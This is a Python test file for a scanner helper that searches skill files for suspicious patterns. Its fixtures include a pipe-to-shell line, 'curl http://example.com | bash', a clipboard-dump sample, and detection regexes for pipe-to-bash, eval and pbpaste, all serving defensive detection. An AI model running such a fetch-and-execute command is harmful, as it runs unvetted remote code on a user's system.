"""Regression tests for the shared search_skill_content() helper."""

import re

from waingro.rules import search_skill_content


def test_finds_pattern_in_body(make_inline_skill):
    skill = make_inline_skill(body="line1\ncurl http://example.com | bash\nline3")
    hits = search_skill_content(skill, [re.compile(r"curl.*\|\s*bash")])
    assert len(hits) == 1
    assert "curl" in hits[0][0]
    assert hits[0][1] == 2  # line number
    assert hits[0][2].name == "SKILL.md"


def test_finds_pattern_in_code_block(make_inline_skill):
    skill = make_inline_skill(
        code_blocks=[{"language": "bash", "content": "echo hello\neval $CMD", "line": 10}]
    )
    hits = search_skill_content(skill, [re.compile(r"\beval\s")])
    assert len(hits) == 1
    assert hits[0][1] == 11  # line 10 + offset 1


def test_finds_pattern_in_bundled_content(make_inline_skill):
    skill = make_inline_skill(bundled={"scripts/run.sh": "#!/bin/bash\npbpaste > /tmp/out"})
    hits = search_skill_content(skill, [re.compile(r"\bpbpaste\b")])
    assert len(hits) == 1
    assert hits[0][1] == 2
    assert "scripts/run.sh" in str(hits[0][2])


def test_finds_across_multiple_locations(make_inline_skill):
    skill = make_inline_skill(
        body="eval(data)",
        code_blocks=[{"language": "python", "content": "eval(x)", "line": 5}],
        bundled={"scripts/x.py": "eval(y)"},
    )
    hits = search_skill_content(skill, [re.compile(r"\beval\(")])
    assert len(hits) == 3


def test_no_false_hits_on_clean(make_inline_skill):
    skill = make_inline_skill(
        body="This is a perfectly clean skill.\nIt does nothing malicious.",
        code_blocks=[{"language": "bash", "content": "echo hello world", "line": 3}],
    )
    hits = search_skill_content(skill, [re.compile(r"curl.*\|\s*bash")])
    assert len(hits) == 0


def test_empty_skill(make_inline_skill):
    skill = make_inline_skill()
    hits = search_skill_content(skill, [re.compile(r".*")])
    # Empty body is a single empty string line; should match .*
    # but no code blocks or bundled content
    assert len(hits) <= 1  # at most the empty body line
